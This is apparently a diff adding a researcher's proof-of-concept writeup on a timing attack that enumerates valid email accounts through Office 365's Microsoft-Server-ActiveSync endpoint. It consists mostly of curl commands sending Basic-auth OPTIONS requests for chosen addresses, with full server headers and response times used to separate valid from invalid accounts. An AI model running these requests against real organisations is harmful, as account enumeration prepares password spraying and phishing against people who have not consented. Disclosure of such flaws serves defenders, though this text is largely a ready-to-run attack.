@@ -1,0 +1,83 @@
+After some researching through a personal pentesting, i've realized that i was able to enumerate valid / invalid e-mails through old, famous and "patched" Microsoft-Server-ActiveSync vulnerability disclosed by @grimhacker.
+
+As we know, these kind of vulnerabilities are only possible because servers response delays, being possible to know if an user is valid or not through timing attacks.
+
+At references below, you can see how those patched vulnerabilities was exploitated in the past, and how i took me several "minutes" to realize that now "patched" vulnerbility stay exploitable. I don't know if it was disclosure by someone in the past, but it worked very well on personal tests without microsoft domains. 
+
+References and materials used in researching:
+https://bitbucket.org/grimhacker/office365userenum/src/master/office365userenum.py
+https://github.com/binary1985/VulnerabilityDisclosure/blob/master/ADFS-Timing-Attack
+
+POC:
+---------------------------------------------------------
+support@microsoft.com -> VALID email
+It took 5 seconds to get server response
+
+Different domains should took 5-8 seconds normally...
+
+Command:
+time curl -Lv -v "https://outlook.office365.com/Microsoft-Server-ActiveSync" -I -X OPTIONS -H "Authorization: Basic $(echo -ne support@microsoft.com:blabla1 | base64 )"
+
+Response:
+HTTP/1.1 401 Unauthorized
+Content-Length: 1293
+Content-Type: text/html
+Server: Microsoft-IIS/10.0
+request-id: 39bee372-9505-4bf2-96b2-1b052f518bba
+X-CalculatedFETarget: DM5PR07CU003.internal.outlook.com
+X-BackEndHttpStatus: 401
+WWW-Authenticate: Basic Realm="",Negotiate
+X-FEProxyInfo: DM5PR07CA0057.NAMPRD07.PROD.OUTLOOK.COM
+X-CalculatedBETarget: DM5PR21MB0137.namprd21.prod.outlook.com
+X-BackEndHttpStatus: 401
+X-RUM-Validated: 1
+X-DiagInfo: DM5PR21MB0137
+X-BEServer: DM5PR21MB0137
+X-Proxy-RoutingCorrectness: 1
+X-Proxy-BackendServerStatus: 401
+X-FEServer: DM5PR07CA0057
+X-Powered-By: ASP.NET
+X-FEServer: CP2P15201CA0009
+Date: Thu, 19 Mar 2020 18:27:45 GMT
+
+Response Time:
+real    0m5.654s	<-----
+user    0m0.021s
+sys     0m0.015s
+
+---------------------------------------------------------
+
+support51231295127389125@microsoft.com -> INVALID email
+It took 8 seconds to get server response
+
+Different domains should took 11 seconds normally...
+
+Command:
+time curl -Lv -v "https://outlook.office365.com/Microsoft-Server-ActiveSync" -I -X OPTIONS -H "Authorization: Basic $(echo -ne support51231295127389125@microsoft.com:blabla1 | base64)"
+
+Response:
+HTTP/1.1 401 Unauthorized
+Content-Length: 1293
+Content-Type: text/html
+Server: Microsoft-IIS/10.0
+request-id: fc5ed3a2-7571-43d1-bade-0d2e90db3e00
+X-CalculatedFETarget: FR1PR80CU006.internal.outlook.com
+X-BackEndHttpStatus: 401
+WWW-Authenticate: Basic Realm="",Negotiate
+X-FEProxyInfo: FR1PR80CA0137.LAMPRD80.PROD.OUTLOOK.COM
+X-CalculatedBETarget: FR1PR80MB4760.lamprd80.prod.outlook.com
+X-BackEndHttpStatus: 401
+X-RUM-Validated: 1
+X-DiagInfo: FR1PR80MB4760
+X-BEServer: FR1PR80MB4760
+X-Proxy-RoutingCorrectness: 1
+X-Proxy-BackendServerStatus: 401
+X-FEServer: FR1PR80CA0137
+X-Powered-By: ASP.NET
+X-FEServer: CP2PR80CA0165
+Date: Thu, 19 Mar 2020 18:28:02 GMT
+
+Response Time:
+real    0m8.581s	<-----
+user    0m0.020s
+sys     0m0.013s
